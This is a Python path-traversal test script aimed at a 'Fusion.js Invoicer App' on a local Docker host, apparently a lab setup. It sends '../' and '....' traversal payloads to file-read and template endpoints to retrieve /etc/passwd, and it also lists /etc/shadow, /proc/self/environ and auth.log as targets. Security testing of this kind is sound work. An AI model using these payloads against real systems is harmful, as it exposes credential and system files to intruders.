#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import traceback

# Configuration
BASE_URL = "http://10.0.0.105:3001"  # Docker host IP
TIMEOUT = 3  # seconds

LINUX_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/log/auth.log"
]

def make_request(url, params=None):
    """Make a request with timeout and error handling"""
    try:
        print(f"\n[DEBUG] Requesting: {url} with params {params}")
        r = requests.get(url, params=params, timeout=TIMEOUT)
        print(f"[DEBUG] Response status: {r.status_code}")
        return r
    except requests.exceptions.Timeout:
        print(f"[ERROR] Request timed out: {url}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def test_simple_path_traversal():
    """Test simple path traversal using path.join"""
    print("\n[+] Testing Simple Path Traversal")
    endpoint = f"{BASE_URL}/api/file/read"
    
    # Test accessing test.txt (should work)
    r = make_request(endpoint, {"file": "test.txt"})
    if not r:
        print("[-] Failed to access test.txt")
        return
    print(f"[*] Accessing test.txt: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Content: {r.text.strip()}")

    # Test path traversal
    for target in LINUX_TARGETS[:1]:  # Test only first target for now
        traversal = "../" * 10 + target.lstrip("/")
        r = make_request(endpoint, {"file": traversal})
        if not r:
            print(f"[-] Failed to test traversal for {target}")
            continue
        print(f"\n[*] Trying to access {target}")
        print(f"[*] Status: {r.status_code}")
        if r.status_code == 200:
            print(f"[*] First few lines:\n{r.text[:200]}")

def test_bypass_replace():
    """Test path traversal with '../' replacement bypass"""
    print("\n[+] Testing Bypass Replace Vulnerability")
    endpoint = f"{BASE_URL}/api/file/secure-read"
    
    for target in LINUX_TARGETS[:1]:  # Test only first target for now
        traversal = "...." * 10 + target.lstrip("/")
        r = make_request(endpoint, {"filename": traversal})
        if not r:
            print(f"[-] Failed to test bypass for {target}")
            continue
        print(f"\n[*] Trying to access {target}")
        print(f"[*] Status: {r.status_code}")
        if r.status_code == 200:
            print(f"[*] First few lines:\n{r.text[:200]}")

def test_template_traversal():
    """Test path traversal in template loading"""
    print("\n[+] Testing Template Path Traversal")
    endpoint = f"{BASE_URL}/api/file/template"
    
    # Test accessing invoice.html (should work)
    r = make_request(endpoint, {"template": "invoice.html"})
    if not r:
        print("[-] Failed to access invoice.html")
        return
    print(f"[*] Accessing invoice.html: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Content: {r.text[:200]}")

    # Test path traversal
    for target in LINUX_TARGETS[:1]:  # Test only first target for now
        traversal = "../" * 5 + target.lstrip("/")
        r = make_request(endpoint, {"template": traversal})
        if not r:
            print(f"[-] Failed to test template traversal for {target}")
            continue
        print(f"\n[*] Trying to access {target}")
        print(f"[*] Status: {r.status_code}")
        if r.status_code == 200:
            print(f"[*] First few lines:\n{r.text[:200]}")

def main():
    print("[+] Path Traversal Vulnerability Tests")
    print("[+] Target: Fusion.js Invoicer App")
    
    try:
        # Test basic connectivity
        print("[*] Testing basic connectivity...")
        r = make_request(f"{BASE_URL}/api/file/read", {"file": "test.txt"})
        if not r:
            print("[-] Cannot connect to application")
            return
        if r.status_code != 200:
            print(f"[-] Application returned status {r.status_code}")
            return
        
        # Run tests one by one
        test_simple_path_traversal()
        print("\n[*] Press Enter to continue with bypass test...")
        input()
        test_bypass_replace()
        print("\n[*] Press Enter to continue with template test...")
        input()
        test_template_traversal()
        
    except KeyboardInterrupt:
        print("\n[-] Test interrupted by user")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main() 